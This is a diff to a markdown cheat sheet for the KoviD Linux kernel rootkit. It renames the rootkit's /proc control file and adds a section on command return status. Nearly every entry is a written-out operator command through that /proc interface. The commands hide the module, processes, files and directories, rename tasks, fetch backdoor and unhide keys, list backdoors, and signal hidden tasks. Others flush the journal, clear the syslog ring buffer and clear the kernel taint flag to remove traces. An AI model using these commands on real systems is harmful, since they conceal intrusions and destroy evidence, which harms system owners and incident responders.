@@ -1,6 +1,5 @@
 # CheatSheet
 
-
 ## proc UI visibility
 
 *Action:* run
@@ -10,6 +9,38 @@
 *Commands:*
 - `kill -CONT 31337`
 
+## Command status
+
+*Commands that return execution status:*
+
+- hide-pid
+- hide-task-backdoor
+- rename-task
+- hide-lkm
+- unhide-lkm
+- hide-file
+- unhide-directory
+- hide-file-anywhere
+- journal-flush
+- signal-task-stop
+- signal-task-cont
+- signal-task-kill
+- taint-clear
+- syslog-clear
+
+*How to check:*
+- `cat /proc/myprocname`
+
+* == 0:* Success
+*  < 0:* Error
+
+*Default*: Disabled
+
+*Toggle and Check enable/disable:*
+- `echo output-enable >/proc/myprocname && cat /proc/myprocname`
+
+* == 0:* Disabled
+* == 1:* Enabled
 
 ## KoviD invisibility
 
@@ -22,7 +53,7 @@
 *Root required:* debug No, deploy Yes
 
 *Commands:*
-- `echo hide-lkm >/proc/example`
+- `echo hide-lkm >/proc/myprocname`
 
 
 ## KoviD visibility
@@ -36,9 +67,9 @@
 *Root required:* No
 
 *Commands:*
-- `echo get-unhidekey >/proc/example`
-- `key=$(cat /proc/example)`
-- `echo unhide-lkm=$key > /proc/example`
+- `echo get-unhidekey >/proc/myprocname`
+- `key=$(cat /proc/myprocname)`
+- `echo unhide-lkm=$key > /proc/myprocname`
 
 
 ## KoviD visibility in DEPLOY mode
@@ -52,7 +83,7 @@
 *Root required:* Yes
 
 *Commands:*
-- `echo unhide-lkm=<KEY> > /proc/example`
+- `echo unhide-lkm=<KEY> > /proc/myprocname`
 
 
 ## Unload KoviD
@@ -94,8 +125,8 @@
 *Root required:* No
 
 *Commands:*
-- `echo get-unhidekey >/proc/example`
-- `cat /proc/example`
+- `echo get-unhidekey >/proc/myprocname`
+- `cat /proc/myprocname`
 
 
 ## Get back-doors KEY
@@ -109,8 +140,8 @@
 *Root required:* No
 
 *Commands:*
-- `echo get-bdkey >/proc/example`
-- `cat /proc/example`
+- `echo get-bdkey >/proc/myprocname`
+- `cat /proc/myprocname`
 
 
 ## Hide process (PID)
@@ -119,12 +150,12 @@
 
 *Mode:* debug,deploy
 
-*About:* to hide/unhide tasks, example PID `1234`
+*About:* to hide/unhide tasks, myprocname PID `1234`
 
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo 1234 >/proc/example`
+- `echo 1234 >/proc/myprocname`
 
 
 ## Hide a file in current directory
@@ -138,7 +169,7 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo hide-file=README.txt >/proc/example`
+- `echo hide-file=README.txt >/proc/myprocname`
 
 
 ## Hide a file elsewhere
@@ -152,7 +183,7 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo hide-file=/home/user/README.txt >/proc/example`
+- `echo hide-file=/home/user/README.txt >/proc/myprocname`
 
 
 ## Hide all instances of a file
@@ -166,7 +197,7 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo hide-file-anywhere=README.txt >/proc/example`
+- `echo hide-file-anywhere=README.txt >/proc/myprocname`
 
 
 ## Hide a directory in current directory
@@ -180,7 +211,7 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo hide-directory=dir1 >/proc/example`
+- `echo hide-directory=dir1 >/proc/myprocname`
 
 
 ## Hide a directory elsewhere
@@ -194,7 +225,7 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo hide-directory=/home/some-user/dir1 >/proc/example`
+- `echo hide-directory=/home/some-user/dir1 >/proc/myprocname`
 
 
 ## Unhide a directory
@@ -208,7 +239,7 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo unhide-directory=dir1 >/proc/example`
+- `echo unhide-directory=dir1 >/proc/myprocname`
 
 
 ## List hidden files
@@ -222,7 +253,7 @@
 *Root required:* No
 
 *Commands:*
-- `echo list-hidden-files >/proc/example`
+- `echo list-hidden-files >/proc/myprocname`
 - `dmesg`
 
 
@@ -237,7 +268,7 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo rename-task=1234,newtaskname >/proc/example`
+- `echo rename-task=1234,newtaskname >/proc/myprocname`
 
 
 ## List hidden tasks (PIDs)
@@ -251,7 +282,7 @@
 *Root required:* No
 
 *Commands:*
-- `echo list-hidden-tasks >/proc/example`
+- `echo list-hidden-tasks >/proc/myprocname`
 - `dmesg`
 
 
@@ -266,7 +297,7 @@
 *Root required:* No
 
 *Commands:*
-- `echo list-backdoor >/proc/example`
+- `echo list-backdoor >/proc/myprocname`
 - `dmesg`
 
 
@@ -281,8 +312,8 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo base-address=1234 >/proc/example`
-- `cat /proc/example`
+- `echo base-address=1234 >/proc/myprocname`
+- `cat /proc/myprocname`
 
 
 ## Run journal flush
@@ -296,7 +327,7 @@
 *Root required:* debug=No, deploy=Yes
 
 *Commands:*
-- `echo journal-flush >/proc/example`
+- `echo journal-flush >/proc/myprocname`
 
 
 ## Send signal to hidden task
@@ -305,14 +336,14 @@
 
 *Mode:* debug,release
 
-*About:* Available: stop,cont,kill, example signalling PID 1234
+*About:* Available: stop,cont,kill, myprocname signalling PID 1234
 
 *Root required:* debug=No, release=Yes
 
 *Commands:*
-- `echo signal-task-stop=1234 >/proc/example`
-- `echo signal-task-cont=1234 >/proc/example`
-- `echo signal-task-kill=1234 >/proc/example`
+- `echo signal-task-stop=1234 >/proc/myprocname`
+- `echo signal-task-cont=1234 >/proc/myprocname`
+- `echo signal-task-kill=1234 >/proc/myprocname`
 
 
 ## Clear ring-buffer
@@ -326,7 +357,7 @@
 *Root required:* debug=No, release=Yes
 
 *Commands:*
-- `echo syslog-clear >/proc/example`
+- `echo syslog-clear >/proc/myprocname`
 
 
 ## Clear /proc `tainted`
@@ -340,4 +371,4 @@
 *Root required:* debug=No, release=Yes
 
 *Commands:*
-- `echo taint-clear >/proc/example`
+- `echo taint-clear >/proc/myprocname`
